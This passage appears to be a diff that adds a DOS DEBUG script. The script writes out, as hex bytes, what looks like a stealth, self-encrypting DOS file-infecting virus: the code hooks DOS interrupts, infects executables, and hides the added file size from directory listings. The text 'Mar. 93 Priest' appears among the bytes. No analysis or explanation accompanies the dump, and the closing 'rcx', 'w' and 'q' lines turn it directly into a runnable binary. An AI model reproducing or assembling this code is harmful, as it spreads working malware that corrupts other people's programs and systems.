+e 0170  29 20 4D 61 72 2E 20 39 33 20 20 50 72 69 65 73 
+e 0180  74 CD 20 00 2E 43 4F 4D 00 0E 1F B8 21 35 CD 21 
+e 0190  89 1E 1D 04 8C 06 1F 04 B0 13 CD 21 89 1E 19 04 
+e 01A0  8C 06 1B 04 B4 25 BA 6D 03 CD 21 B0 21 BA D8 00 
+e 01B0  CD 21 33 C0 8E D8 A1 6C 04 0E 1F 86 C4 01 06 31 
+e 01C0  04 16 07 BF 00 01 E8 00 00 5E 81 EE 48 00 16 57 
+e 01D0  FC A5 A4 16 1F 33 C0 CB 80 FC 3D 74 4B 80 FC 6C 
+e 01E0  74 3F 80 FC 4B 74 41 80 FC 11 74 2C 80 FC 12 74 
+e 01F0  27 80 FC 0F 74 25 80 FC 4E 74 1A 80 FC 4F 74 15 
+e 0200  80 FC 30 75 0B 81 FB 4D 49 75 05 8B C3 CA 02 00 
+e 0210  2E FF 2E 1D 04 E9 9A 01 E9 C5 01 E9 FA 01 E9 DC 
+e 0220  00 2E 89 36 27 04 EB 05 2E 89 16 27 04 2E 8C 1E 
+e 0230  29 04 2E C6 06 2B 04 00 E8 26 01 E8 37 01 E8 08 
+e 0240  02 72 DB 2E C5 16 27 04 B8 00 43 50 E8 5C 01 58 
+e 0250  72 CC 2E 88 0E 30 04 F6 C1 01 74 0F 33 C9 FE C0 
+e 0260  E8 48 01 72 B9 2E 80 0E 2B 04 01 B8 C2 3D E8 3A 
+e 0270  01 72 AB 93 0E 1F 80 0E 2B 04 02 B8 00 57 E8 2A 
+e 0280  01 80 FE C8 73 77 80 C6 C8 89 16 2E 04 89 0E 2C 
+e 0290  04 B4 3F B9 03 00 BA 81 00 E8 0F 01 3B C1 75 5D 
+e 02A0  81 3E 81 00 5A 4D 74 55 81 3E 81 00 4D 5A 74 4D 
+e 02B0  B0 02 E8 8F 00 0B D2 75 44 3D E8 03 72 3F 3D 30 
+e 02C0  F8 77 3A BF 16 04 50 05 00 01 A3 05 04 0E 07 B0 
+e 02D0  E9 FC AA 58 2D 03 00 AB E8 E2 01 B4 40 BA 34 04 
+e 02E0  B9 30 04 E8 C5 00 72 15 80 0E 2B 04 04 32 C0 E8 
+e 02F0  52 00 B4 40 BA 16 04 B9 03 00 E8 AE 00 2E F6 06 
+e 0300  2B 04 02 74 1C 2E F6 06 2B 04 04 74 0F B8 01 57 
+e 0310  2E 8B 16 2E 04 8B 0E 2C 04 E8 8F 00 B4 3E E8 8A 
+e 0320  00 2E F6 06 2B 04 01 74 12 B8 01 43 33 C9 2E 8A 
+e 0330  0E 30 04 2E C5 16 27 04 E8 70 00 E8 58 00 E8 0C 
+e 0340  00 E9 CC FE B4 42 33 C9 99 E8 5F 00 C3 2E 8F 06 
+e 0350  25 04 07 1F 5E 5F 5D 5A 59 5B 58 9D 2E FF 26 25 
+e 0360  04 2E 8F 06 25 04 9C 50 53 51 52 55 57 56 1E 06 
+e 0370  2E FF 26 25 04 E8 E9 FF B8 24 35 E8 2D 00 2E 89 
+e 0380  1E 21 04 2E 8C 06 23 04 B4 25 0E 1F BA A8 02 E8 
+e 0390  19 00 E8 B8 FF C3 E8 C8 FF B8 24 25 2E C5 16 21 
+e 03A0  04 E8 07 00 E8 A6 FF C3 B0 03 CF 9C 2E FF 1E 1D 
+e 03B0  04 C3 E8 F6 FF E8 A9 FF 72 20 B4 2F E8 EC FF 26 
+e 03C0  80 BF 19 00 C8 72 13 26 80 AF 19 00 C8 26 81 AF 
+e 03D0  1A 00 30 04 26 83 9F 1C 00 00 E8 70 FF E9 2D FE 
+e 03E0  E8 C8 FF E8 7B FF 0A C0 75 28 B4 2F E8 BC FF 80 
+e 03F0  3F FF 75 03 83 C3 07 26 80 BF 1A 00 C8 72 13 26 
+e 0400  80 AF 1A 00 C8 26 81 AF 1D 00 30 04 26 83 9F 1F 
+e 0410  00 00 E8 38 FF E9 F5 FD E8 90 FF E8 43 FF 3C 00 
+e 0420  75 21 8B DA 80 3F FF 75 03 83 C3 07 80 BF 15 00 
+e 0430  C8 72 10 80 AF 15 00 C8 81 AF 10 00 30 04 83 9F 
+e 0440  12 00 00 E8 07 FF E9 C4 FD 0E 1F C4 3E 27 04 32 
+e 0450  C0 B9 7F 00 FC F2 AE 83 F9 7A 73 0F B9 05 00 2B 
+e 0460  F9 BE 84 00 FC F3 A6 75 02 F8 C3 F9 C3 80 FC 02 
+e 0470  74 0B 2E FF 2E 19 04 E8 D3 FE CA 02 00 2E A2 33 
+e 0480  04 9C 2E FF 1E 19 04 E8 D7 FE 72 EB 2E A0 33 04 
+e 0490  98 2E 29 06 31 04 77 DF BB 00 02 99 F7 E3 48 33 
+e 04A0  C9 8E D9 8B 0E 6C 04 2E 89 0E 31 04 51 23 C8 03 
+e 04B0  D9 59 02 CD 26 D3 1F F5 26 D3 17 EB BA 33 C0 8E 
+e 04C0  D8 A1 6C 04 0E 1F 00 06 00 04 A0 00 04 02 E0 00 
+e 04D0  26 0F 04 BE FC 03 BF 34 04 B9 19 00 FC F3 A4 BE 
+e 04E0  00 00 B9 0C 02 91 50 AD D3 C0 F7 D0 AB 58 91 E2 
+e 04F0  F4 4F 4F 81 EF 34 04 01 3E 3D 04 C3 BA 0C 02 B1 
+e 0500  00 FA 8B EC BC 34 12 58 F7 D0 D3 C8 50 EB 01 12 
+e 0510  4C 4C 4A 75 F2 00 00 00 00 00 00 00 00 00 00 00 
+e 0520  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0530  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0540  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0550  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0560  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0570  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0580  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0590  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 05F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0600  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0610  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0620  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0630  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0640  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0650  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0660  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0670  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0680  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0690  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 06F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0700  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0720  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0730  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0740  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0750  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0760  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0770  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0780  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0790  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 07F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0800  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0810  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0820  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0830  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0840  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0850  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0860  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0870  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0880  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0890  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 08F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0900  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0910  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0920  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0930  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0940  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0950  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+e 0960  00 00 00 00 
+
+rcx
+0864
+w
+q
+-------------------------------------------------------------------------------
+
